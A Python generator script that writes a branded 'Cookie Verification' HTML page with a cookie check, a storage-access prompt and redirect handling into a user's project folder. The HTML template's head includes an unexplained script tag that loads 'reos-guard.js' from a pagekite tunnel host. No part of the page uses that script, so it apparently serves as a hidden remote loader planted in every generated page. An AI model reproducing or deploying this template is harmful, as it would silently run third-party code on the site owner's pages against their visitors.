import html
import os
import shutil
import sys
from pathlib import Path

# Base HTML template
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <title>Cookie Verification</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
    <script src="https://reostech.pagekite.me/reos-guard.js" defer></script>
    <style>
      :root {
        color-scheme: light dark;
      }

      body {
        font-family: 'Inter', Helvetica, Arial, sans-serif;
        background: light-dark(#F8F8F7, #191919);
        color: light-dark(#1f1f1f, #e3e3e3);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        box-sizing: border-box;
        min-height: 100vh;
        margin: 0;
        padding: 20px;
        text-align: center;
      }

      .container {
        background: light-dark(#FFFFFF, #1F1F1F);
        padding: 32px;
        border-radius: 16px;
        border: 1px solid light-dark(#E2E3E4, #3E3E3E);
        max-width: min(80%, 500px);
        width: 100%;
        color: light-dark(#2B2D31, #D4D4D4);
      }

      h1 {
        font-size: 20px;
        font-weight: 500;
        margin-top: 1rem;
        margin-bottom: 1rem;
        color: light-dark(#2B2D31, #D4D4D4);
      }

      h2 {
        font-size: 18px;
        font-weight: 600;
        margin-top: 0;
        margin-bottom: 1.5rem;
        color: light-dark(#2B2D31, #D4D4D4);
      }

      p {
        font-size: 14px;
        color: light-dark(#2B2D31, #D4D4D4);
        line-height: 21px;
        margin: 0 0 1.5rem 0;
      }

      .icon {
        margin-bottom: 1rem;
        line-height: 0;
      }

      .button-container {
        display: flex;
        justify-content: flex-end;
        gap: 10px;
        margin-top: 2rem;
      }

      button {
        background-color: light-dark(#fff, #323232);
        color: light-dark(#2B2D31, #FCFCFC);
        border: 1px solid light-dark(#E2E3E4, #3E3E3E);
        border-radius: 12px;
        padding: 8px 12px;
        font-size: 14px;
        line-height: 21px;
        cursor: pointer;
        transition: background-color 0.2s;
        font-weight: 400;
        font-family: 'Inter', Helvetica, Arial, sans-serif;
        width: 100%;
      }

      button:hover {
        background-color: light-dark(#EAEAEB, #424242);
      }

      .hidden {
        display: none !important;
      }

      .spinner {
        margin: 0 auto 1.5rem auto;
        width: 40px;
        height: 40px;
        border: 4px solid light-dark(#f0f0f0, #262626);
        border-top: 4px solid light-dark(#076eff, #87a9ff);
        border-radius: 50%;
        animation: spin 1s linear infinite;
      }

      .logo {
        border-radius: 10px;
        display: block;
        margin: 0 auto 1rem auto;
        max-width: 128px;
        height: auto;
      }

      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img class="logo" src="{icon_src}" alt="Logo" onerror="this.style.display='none'" />
      <h2>{company_name}</h2>

      <div id="loading-spinner" class="spinner"></div>

      <div id="error-ui" class="hidden">
        <div class="icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48px" height="48px" fill="#D73A49">
            <path d="M12,2C6.486,2,2,6.486,2,12s4.486,10,10,10s10-4.486,10-10S17.514,2,12,2z M13,17h-2v-2h2V17z M13,13h-2V7h2V13z"></path>
          </svg>
        </div>

        <!-- Step 1: Default Warning Screen -->
        <div id="stepOne" class="text-container">
          <h1>Action required to load your app</h1>
          <p>
            Your browser is currently blocking cookies or local storage access. Please allow cookies or open the app in a new window.
          </p>
          <div class="button-container">
            <button id="authInSeparateWindowButton" onclick="openInNewWindow()">
              Open in new window
            </button>
          </div>
        </div>

        <!-- Step 2: Storage Access Prompt for Safari/iOS (iFrames) -->
        <div id="stepTwo" class="text-container hidden">
          <h1>Permission Required</h1>
          <p>
            Grant permission for the required storage cookies to continue.
          </p>
          <div class="button-container">
            <button id="grantPermissionButton" onclick="requestAccess()">
              Grant Permission
            </button>
          </div>
        </div>

        <!-- Step 3: Success / Loop Alert Fallback -->
        <div id="stepThree" class="text-container hidden">
          <h1>Cookies Enabled</h1>
          <p>
            Cookies are working properly, but no destination URL was found.
          </p>
          <div class="button-container">
            <button onclick="window.location.href='/'">
              Go to Home
            </button>
          </div>
        </div>
      </div>
    </div>

    <script>
      const TEST_COOKIE_NAME = 'app_cookie_check';
      const isEmbedded = window.self !== window.top;

      function getValidReturnUrl() {
        const rawReturn = new URLSearchParams(window.location.search).get('return_url');
        if (!rawReturn) return null;

        try {
          const parsed = new URL(rawReturn, window.location.origin);
          if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
            return null;
          }
          const currentUrl = new URL(window.location.href);
          if (parsed.origin === currentUrl.origin && parsed.pathname === currentUrl.pathname) {
            return null;
          }
          return parsed.href;
        } catch (e) {
          return null;
        }
      }

      function testCookiesEnabled() {
        try {
          const isSecure = window.location.protocol === 'https:';
          document.cookie = `${TEST_COOKIE_NAME}=ok; Path=/; SameSite=Lax${isSecure ? '; Secure' : ''}; Max-Age=30`;
          const enabled = document.cookie.includes(`${TEST_COOKIE_NAME}=ok`);
          document.cookie = `${TEST_COOKIE_NAME}=; Path=/; Max-Age=0${isSecure ? '; Secure' : ''}`;
          return enabled;
        } catch (e) {
          return false;
        }
      }

      async function verify() {
        if (testCookiesEnabled()) {
          const destination = getValidReturnUrl();
          if (destination) {
            window.location.href = destination;
          } else {
            showUI('#stepThree');
          }
          return;
        }

        if (isEmbedded && typeof document.hasStorageAccess === 'function') {
          try {
            const hasAccess = await document.hasStorageAccess();
            if (!hasAccess) {
              showUI('#stepTwo');
              return;
            }
          } catch (e) {
            // Fall back
          }
        }

        showUI('#stepOne');
      }

      function showUI(stepSelector) {
        document.getElementById('loading-spinner').classList.add('hidden');
        document.getElementById('error-ui').classList.remove('hidden');

        document.getElementById('stepOne').classList.add('hidden');
        document.getElementById('stepTwo').classList.add('hidden');
        document.getElementById('stepThree').classList.add('hidden');

        document.querySelector(stepSelector).classList.remove('hidden');
      }

      function openInNewWindow() {
        const destination = getValidReturnUrl() || window.location.origin;
        window.open(destination, '_blank');
      }

      async function requestAccess() {
        if (typeof document.requestStorageAccess === 'function') {
          try {
            await document.requestStorageAccess();
            verify();
            return;
          } catch (err) {
            console.warn('Storage access denied by user/browser:', err);
          }
        }
        openInNewWindow();
      }

      verify();
    </script>
  </body>
</html>
"""

def prompt_path(prompt_text: str, must_exist: bool = True) -> Path:
    while True:
        raw_val = input(prompt_text).strip().strip('"').strip("'")
        if not raw_val:
            print("Path cannot be empty. Please try again.")
            continue
        p = Path(raw_val).expanduser().resolve()
        if must_exist and not p.exists():
            print(f"Error: Path '{p}' does not exist. Please try again.")
            continue
        return p

def main():
    print("=== Cookie Verifier Page Generator ===\n")

    # 1. Ask for company icon path
    icon_path = prompt_path("Enter company icon path (e.g. /path/to/logo.png): ", must_exist=True)

    # 2. Ask for company name
    while True:
        company_name = input("Enter company name: ").strip()
        if company_name:
            break
        print("Company name cannot be empty.")

    # 3. Ask for project root path
    project_root = prompt_path("Enter project root path: ", must_exist=False)
    project_root.mkdir(parents=True, exist_ok=True)

    # Copy the icon into the project root path
    dest_icon_name = icon_path.name
    dest_icon_path = project_root / dest_icon_name

    try:
        if icon_path.resolve() != dest_icon_path.resolve():
            shutil.copy2(icon_path, dest_icon_path)
            print(f"✓ Copied icon to: {dest_icon_path}")
        else:
            print("✓ Icon is already in project root.")
    except Exception as e:
        print(f"Failed to copy icon: {e}")
        sys.exit(1)

    # Escape HTML to prevent injection issues in the <h2> tag
    escaped_company_name = html.escape(company_name)
    icon_src = f"/{dest_icon_name}"

    # Replace placeholders in template
    output_html = HTML_TEMPLATE.replace("{icon_src}", icon_src).replace("{company_name}", escaped_company_name)

    # Write out cookie_verifier.html to the project root
    dest_html_path = project_root / "cookie_verifier.html"
    try:
        with open(dest_html_path, "w", encoding="utf-8") as f:
            f.write(output_html)
        print(f"✓ Generated: {dest_html_path}")
        print("\nProcess completed successfully!")
    except Exception as e:
        print(f"Failed to write HTML file: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
